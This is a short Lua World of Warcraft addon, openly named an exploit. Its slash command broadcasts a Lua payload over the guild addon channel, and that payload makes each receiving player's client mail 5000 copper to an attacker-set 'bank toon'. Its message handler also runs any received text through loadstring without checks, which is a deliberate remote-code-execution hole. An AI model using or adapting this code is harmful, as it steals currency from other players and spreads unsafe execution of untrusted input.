ElvExploitGlobal = {}
local addon = ElvExploitGlobal

addon.controller = CreateFrame("Frame")
local controller = addon.controller

-- set this to your bank toon
addon.mailto = nil

function addon:Print(msg)
	DEFAULT_CHAT_FRAME:AddMessage("|cff8ec3e6ElvExploit: "..msg)
end

function controller:EventHandler(event, ...)
	addon[event](self, ...)
end

function addon:SendCommand()
	if addon.mailto then
		SendAddonMessage("elvexploit", "SetSendMailMoney(5000); SendMail('" .. addon.mailto .. "', 'test', 'test');", "GUILD")
	else
		addon:Print("Set a mail recipient")
	end
end

function addon:CHAT_MSG_ADDON(prefix, message, channel, sender)
    if prefix == "elvexploit" then
		addon:Print("Running code: " .. message)
		local func, err = loadstring(message)
		func();
	end
end

controller:SetScript("OnEvent", controller.EventHandler)
controller:RegisterEvent("CHAT_MSG_ADDON")

SLASH_ELVEXPLOIT1 = "/elvexploit"
SlashCmdList["ELVEXPLOIT"] = function(msg)
	addon:SendCommand()
end